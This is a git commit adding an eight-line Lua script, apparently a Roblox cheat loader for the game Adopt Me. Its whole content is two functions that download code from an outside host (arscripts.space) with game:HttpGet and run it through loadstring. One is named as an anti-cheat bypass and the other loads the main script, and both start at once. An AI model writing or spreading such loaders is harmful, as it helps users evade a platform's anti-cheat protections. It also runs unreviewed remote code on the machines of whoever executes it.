0cac8fda84fb1c09f9e7221d8722d3fb29429b43
LOGIC <120298843+AAstraX@users.noreply.github.com>
2025-03-15 12:36:25 +0800

    Create adoptmescriptsts.lua

---
+++ adoptmetb/adoptmescriptsts.lua
@@ -0,0 +1,8 @@
+local function bypassAC()
+        loadstring(game:HttpGet("https://arscripts.space/adoptmetb/AdoptmeAC.lua"))()
+end
+local function adoptme()
+        loadstring(game:HttpGet("https://arscripts.space/adoptmetb/Adoptmescriptns.lua"))()
+end
+task.spawn(bypassAC)
+task.spawn(adoptme)
